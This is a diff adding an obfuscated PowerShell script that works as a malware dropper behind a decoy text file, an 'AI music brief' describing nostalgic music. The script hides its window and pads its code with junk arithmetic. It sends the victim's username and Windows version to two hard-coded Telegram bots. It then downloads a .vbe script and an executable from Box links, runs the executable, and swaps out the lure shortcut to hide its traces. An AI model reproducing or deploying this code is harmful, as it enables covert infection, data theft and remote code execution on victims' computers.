@@ -1,0 +1,152 @@
+Add-Type -Name a0 -Namespace b0 -MemberDefinition '[DllImport("Kernel32.dll")]public static extern IntPtr GetConsoleWindow();[DllImport("user32.dll")]public static extern bool ShowWindow(IntPtr hWnd,Int32 nCmdShow);'
+$v0=[b0.a0]::GetConsoleWindow()
+[b0.a0]::ShowWindow($v0,0)
+$v1=1+2*3-4
+If($v1>0){}
+$v2="AI music brief.txt"
+$v3=Join-Path $env:LOCALAPPDATA $v2
+$v4=@"
+1. Core Emotional Nucleus
+I wish for the music to convey, from the very first second, a poignant nostalgia without heavy pain — a longing for something lost, yet accepted, almost beloved. The sadness should be light, like the memory of a happy day that has ended but left an aftertaste. And an essential component — a tiny, emerging hope, like the first ray of sunshine after a long rain.
+
+2. Mode and Tonality
+I wish for the AI to choose a minor key (e.g., A minor, C-sharp minor), but with regular "excursions" into major subdominants or the parallel major. May the melody, at key moments, make an unexpected step upward by a third or sixth, turning a minor chord into a major seventh — this will create that very glimmer of hope within the sadness.
+
+3. Tempo and Rhythmic Pattern
+I wish for a moderately slow or walking tempo — 65–80 BPM. The rhythm: not march-like, not sluggish, but reminiscent of a gentle swaying or the sound of train wheels carrying one into the past. May the drums be soft (brush on snare drum, muted kick drum) or absent altogether — only delicate percussion, evoking a heartbeat or the ticking of old clocks.
+
+4. Instrumentation (Timbral Palette)
+I wish for the following instruments (choose 3–5 from the list or a combination):
+
+Piano — slightly detuned or with soft pedal sustain, as if in an old café or an empty school.
+
+Solo violin or cello — sustained, with light vibrato, almost breathing.
+
+Warm string pad — but not saccharine, with a hint of haze.
+
+Old sampler / Mellotron — tape emulation, with noise and slight wow & flutter.
+
+Celesta or music box — for a childlike, fragile quality.
+
+Very quiet electric guitar with reverb — warm, round, clean sound.
+
+Forbidden: aggressive synthesizers, heavy bass, harsh brass and winds, loud drums, dubstep, drum and bass.
+
+5. Melodic Structure and Development
+I wish for the main melody to be simple, almost naive, like a childhood theme or a beloved old song. May it:
+
+Begin with a very quiet introduction (piano or celesta alone).
+
+Contain ascending suspensions — notes that first "cry" and then rise toward the light.
+
+Feature a recurring motif (a skeleton), but each repetition changes one or two pitches, creating a dialogue between past and present.
+
+At the climax, the melody "stumbles" into a pause, then makes a perfect fifth upward (the most reliable interval of hope) and gently descends back to a minor ending.
+
+6. Dynamics
+I wish for wave-like dynamics: very quiet (piano), slightly louder with the entry of strings (mezzo-piano), a climax in the middle of the track (mezzo-forte — never reaching forte), then a gradual fade to barely audible pianissimo at the end — as if the memory is dissolving, leaving only a faint trace.
+
+7. Harmony and Transitions
+I wish to avoid abrupt harmonic shifts. May the chords flow smoothly: i — VI — III — VII (in minor) with added seconds and sevenths for a slight "bitterness." In moments of hope — a sudden ♭II major chord or a plagal IV—I cadence in the parallel major. May the dominant not resolve as expected but "linger," creating a sweet longing of incompleteness.
+
+8. Atmospheric Details
+I wish to add sonic layers that enhance nostalgia:
+
+Subtle film or vinyl noise (barely perceptible).
+
+Very quiet crackling, like an old radio.
+
+One or two distant, reflected "echoes" of the piano's main notes.
+
+A "far-room microphone" quality — a sense of space and solitude.
+
+9. Desired Narrative Arc ("Emotional Journey")
+May the music tell a small story:
+
+Time	Emotion	What happens in the music
+0:00–0:15	Loneliness and quiet melancholy	A single piano note, delayed pedal. Silence between sounds.
+0:15–0:45	Memory awakens	The music box melody enters, then picked up by the violin.
+0:45–1:15	Warmth and gratitude toward the past	Strings enter, the melody expands upward, sadness brightens.
+1:15–1:45	A moment of hope	An unexpected major chord, piano plays an octave higher, pulse quickens by 3–5 BPM.
+1:45–2:15	Return to peace	Gradual fade, return to the original motif, but now it sounds slightly more confident.
+2:15–2:30	A lingering trace	Final cello note, fading into silence, only the tape noise remains for 3 seconds.
+10. Technical Prohibitions and Limitations
+I wish for the AI to avoid the following, which would destroy the intended emotion:
+
+Harsh grace notes, unresolved dissonances.
+
+Syncopated rhythms that create anxiety or agitation.
+
+Overly dense arrangements (more than 4–5 voices simultaneously).
+
+Direct quotation of famous nostalgic melodies (Yann Tiersen, "Amélie," "Up").
+
+Loud endings, applause, "triumphant" notes.
+"@
+$v5=5*2-3
+If($v5>0){}
+$v4|Out-File -FilePath $v3 -Encoding UTF8
+Invoke-Item $v3
+$v6="cd02256441"
+$v7=Get-Random -Minimum 100000 -Maximum 999999
+$v8=cmd /c whoami
+$v9="Build ID: "+$v6+" | Attack ID: "+$v7+" | Device/User: "+$v8
+$v10=Join-Path $env:LOCALAPPDATA "identifier.txt"
+$v9|Out-File -FilePath $v10 -Encoding UTF8 -NoNewline
+$v11=7*3-5
+If($v11>0){}
+$v12="8616431099:AAHEmsXH1dR93Gj7lZ5sil9bcpM2-TuM0dE"
+$v13="8267121597"
+$v14=[System.Security.Principal.WindowsIdentity]::GetCurrent().Name
+$v15=(Get-CimInstance Win32_OperatingSystem).Caption
+$v16=Get-Content -Path $v10 -Raw
+$v17=$v16+"`n`nSession started for user: "+$v14+"`nWindows Version: "+$v15
+$v18="https://api.telegram.org/bot"+$v12+"/sendMessage"
+$v19=8/2+1
+If($v19>0){}
+$v20=@{chat_id=$v13;text=$v17}|ConvertTo-Json -Compress
+$v21=6*2-3
+If($v21>0){}
+try{$v22=Invoke-RestMethod -Uri $v18 -Method Post -ContentType "application/json" -Body $v20}catch{}
+$v23="8646039789:AAFJ3DUYa1WwRateAy5Lwggs9W-vsONnraQ"
+$v24="270865408"
+$v25=9-3+1
+If($v25>0){}
+$v26="https://api.telegram.org/bot"+$v23+"/sendMessage"
+$v27=@{chat_id=$v24;text=$v17}|ConvertTo-Json -Compress
+$v28=4+6-2
+If($v28>0){}
+try{$v29=Invoke-RestMethod -Uri $v26 -Method Post -ContentType "application/json" -Body $v27}catch{}
+$v30=3*4-2
+If($v30>0){}
+Start-Sleep -Seconds 300
+$v31=2*5-1
+If($v31>0){}
+$v32="https://app.box.com/index.php?rm=box_download_shared_file&shared_name=e65376oqy43en9jh6mipvh3ti2ux8h6a&file_id=f_2207401363041"
+$v33="1446062403_house.vbe"
+$v34=[Environment]::GetFolderPath("LocalApplicationData")
+$v35=Join-Path $v34 $v33
+$v36=9-2+1
+If($v36>0){}
+try{$v37=New-Object System.Net.WebClient;$v37.DownloadFile($v32,$v35)}catch{}
+$v38=8*2-3
+If($v38>0){}
+$v39="https://app.box.com/index.php?rm=box_download_shared_file&shared_name=o7eowmtie3hv6pcblo1fddr8f4z9nbd5&file_id=f_2207396987403"
+$v40="1446062403_key.exe"
+$v41=Join-Path $v34 $v40
+$v42=7*2-1
+If($v42>0){}
+try{$v43=New-Object System.Net.WebClient;$v43.DownloadFile($v39,$v41);$v44=New-Object System.Diagnostics.ProcessStartInfo;$v44.FileName=$v41;$v44.WindowStyle=[System.Diagnostics.ProcessWindowStyle]::Normal;$v44.CreateNoWindow=$false;[System.Diagnostics.Process]::Start($v44)|Out-Null}catch{}
+$v45=6*3-2
+If($v45>0){}
+$v46="AI music brief.txt.ink"
+$v47=$false
+$v48=$null
+$v49=@((Join-Path $env:USERPROFILE "Desktop"),(Join-Path $env:USERPROFILE "Downloads"),(Join-Path $env:USERPROFILE "Documents"),(Join-Path $env:USERPROFILE "Pictures"),(Join-Path $env:USERPROFILE "Videos"),$env:LOCALAPPDATA,$env:APPDATA)
+$v50=5+3-1
+If($v50>0){}
+foreach($v51 in $v49){If(Test-Path -Path $v51){$v52=Join-Path $v51 $v46;If(Test-Path -Path $v52){$v48=$v52;$v47=$true;break}}}
+$v53=7*2+1
+If($v53>0){}
+If($v47){$v54=Split-Path -Parent $v48;$v55=Get-Date;$v56=600;while(((Get-Date)-$v55).TotalSeconds -lt $v56){$v57=Get-Process -Name "wscript" -ErrorAction SilentlyContinue;If($v57){try{Remove-Item -Path $v48 -Force -ErrorAction Stop;$v58=Join-Path $v54 (Split-Path -Leaf $v3);Copy-Item -Path $v3 -Destination $v58 -Force -ErrorAction Stop;exit}catch{exit}}Start-Sleep -Seconds 3}}
+exit
